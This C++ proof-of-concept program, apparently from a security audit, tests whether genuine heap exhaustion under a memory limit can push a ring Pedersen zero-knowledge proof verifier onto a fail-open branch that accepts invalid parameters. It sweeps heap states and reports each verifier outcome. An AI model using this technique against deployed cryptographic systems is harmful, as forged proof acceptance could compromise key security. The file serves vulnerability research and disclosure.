// POC / NEGATIVE RESULT: can genuine memory exhaustion be steered onto the
// fail-open branch in ring_pedersen_parameters_zkp_verify()?
//
// poc_ring_pedersen_failopen.cpp proves the branch is fail-open when the 161st
// BN_CTX_get() fails.  That was done with a surgical injected failure.  The
// question this program asks is the honest one: under REAL heap exhaustion,
// with no injection at all, does that specific allocation fail while the 160
// before it succeed?
//
// For malloc() to return NULL at all we must run under RLIMIT_AS.  (On a stock
// Linux box with vm.overcommit_memory=0 -- the default, and what this repo's
// deployment does nothing to change -- a 400-byte malloc essentially never
// returns NULL: the kernel grants the arena's brk/mmap optimistically and real
// exhaustion is resolved by the OOM killer SIGKILLing the process.  So this
// test is already assuming a regime much friendlier to the attacker than the
// default one.)
//
// Method: exhaust the heap, then hand back exactly K chunks of the BN_POOL_ITEM
// size class and call the verifier.  Sweep K.  Report which outcome each K
// produces.  ZKP_SUCCESS on invalid parameters at any K == the needle can be
// threaded in this regime.

#include "crypto/commitments/ring_pedersen.h"
#include "ring_pedersen_internal.h"

#include <openssl/bn.h>
#include <openssl/rand.h>

#include <sys/resource.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <vector>

namespace {

const size_t POOL_ITEM = 400;

const char *zkp_name(zero_knowledge_proof_status s)
{
    switch (s) {
    case ZKP_SUCCESS:             return "ZKP_SUCCESS  <== FAIL-OPEN";
    case ZKP_VERIFICATION_FAILED: return "ZKP_VERIFICATION_FAILED";
    case ZKP_INVALID_PARAMETER:   return "ZKP_INVALID_PARAMETER";
    case ZKP_OUT_OF_MEMORY:       return "ZKP_OUT_OF_MEMORY (safe)";
    default:                      return "ZKP_OTHER";
    }
}

} // namespace

int main()
{
    printf("========================================================================\n");
    printf(" Can real heap exhaustion be steered onto the fail-open branch?\n");
    printf("========================================================================\n");

    // ---- prepare invalid parameters + proof BEFORE constraining memory ----
    BN_CTX *ctx = BN_CTX_new();
    BIGNUM *p = BN_new(), *q = BN_new(), *n = BN_new(), *s = BN_new(), *t = BN_new();
    BN_generate_prime_ex(p, 512, 0, nullptr, nullptr, nullptr);
    BN_generate_prime_ex(q, 512, 0, nullptr, nullptr, nullptr);
    BN_mul(n, p, q, ctx);
    BN_rand_range(s, n); BN_rand_range(t, n);
    ring_pedersen_public_t *pub = (ring_pedersen_public_t *)calloc(1, sizeof(*pub));
    pub->n = n; pub->s = s; pub->t = t; pub->mont = nullptr;

    static const uint8_t aad[] = "poc-aad";
    uint32_t plen = sizeof(uint32_t) * 2 + (uint32_t)(BN_num_bytes(n) * 2) * 80;
    std::vector<uint8_t> proof(plen);
    RAND_bytes(proof.data(), (int)proof.size());
    *(uint32_t *)proof.data()     = (uint32_t)BN_num_bytes(n);
    *(uint32_t *)(proof.data() + 4) = 80;

    // warm up so lazy one-time allocations are already done
    zero_knowledge_proof_status warm =
        ring_pedersen_parameters_zkp_verify(pub, aad, sizeof(aad), proof.data(), plen);
    printf("\n  sanity (unconstrained): %s\n", zkp_name(warm));
    if (pub->mont) { BN_MONT_CTX_free(pub->mont); pub->mont = nullptr; }

    // ---- constrain address space so malloc() can actually return NULL -----
    struct rlimit rl;
    getrlimit(RLIMIT_AS, &rl);
    rlim_t cap = 512u * 1024 * 1024;
    rl.rlim_cur = cap;
    if (setrlimit(RLIMIT_AS, &rl) != 0) { printf("  setrlimit failed\n"); return 2; }
    printf("  RLIMIT_AS set to %llu MB (required for malloc to return NULL at all)\n",
           (unsigned long long)(cap / (1024 * 1024)));

    printf("\n  K = number of BN_POOL_ITEM-sized chunks handed back to the allocator\n");
    printf("      immediately before calling the verifier.\n");
    printf("      (the branch needs pool items 1..10 to succeed and #11 to fail)\n\n");
    printf("      %3s | %-8s | %s\n", "K", "reclaim", "verifier result");
    printf("      ----+----------+---------------------------------\n");

    int failopen_hits = 0;

    // Bookkeeping arrays are allocated ONCE, up front, so that nothing in the
    // exhaustion loop itself needs to allocate (a growing std::vector would
    // throw bad_alloc the moment the heap runs dry).
    const size_t MAXB = 1600000, MAXC = 400000;
    void **ballast = (void **)malloc(MAXB * sizeof(void *));
    void **crumbs  = (void **)malloc(MAXC * sizeof(void *));
    if (!ballast || !crumbs) { printf("  bookkeeping alloc failed\n"); return 2; }

    for (int K = 0; K <= 24; ++K) {
        // exhaust the heap with pool-item-sized chunks
        size_t nb = 0;
        while (nb < MAXB) { void *v = malloc(POOL_ITEM); if (!v) break; ballast[nb++] = v; }
        // drain the crumbs so nothing usable but our K chunks remains
        size_t nc = 0;
        for (size_t cs = 256; cs >= 16 && nc < MAXC; cs /= 2) {
            while (nc < MAXC) { void *v = malloc(cs); if (!v) break; crumbs[nc++] = v; }
        }

        // hand back exactly K pool-item-sized chunks
        int given = 0;
        for (int i = 0; i < K && nb > 0; ++i) { free(ballast[--nb]); given++; }

        if (pub->mont) { BN_MONT_CTX_free(pub->mont); pub->mont = nullptr; }
        zero_knowledge_proof_status r =
            ring_pedersen_parameters_zkp_verify(pub, aad, sizeof(aad), proof.data(), plen);

        // release everything before printing (printf itself may allocate)
        for (size_t i = 0; i < nb; ++i) free(ballast[i]);
        for (size_t i = 0; i < nc; ++i) free(crumbs[i]);

        printf("      %3d | %6d   | %s\n", K, given, zkp_name(r));
        if (r == ZKP_SUCCESS) failopen_hits++;
    }

    printf("\n========================================================================\n");
    if (failopen_hits)
        printf(" RESULT: fail-open reached under REAL exhaustion at %d of 25 heap states.\n"
               "         The needle IS threadable in an RLIMIT_AS-constrained process.\n",
               failopen_hits);
    else
        printf(" RESULT: fail-open NEVER reached under real exhaustion across 25 heap\n"
               "         states. Every exhaustion outcome was a SAFE failure. The branch\n"
               "         is real but this route to it did not reproduce.\n");
    printf("========================================================================\n");
    return 0;
}
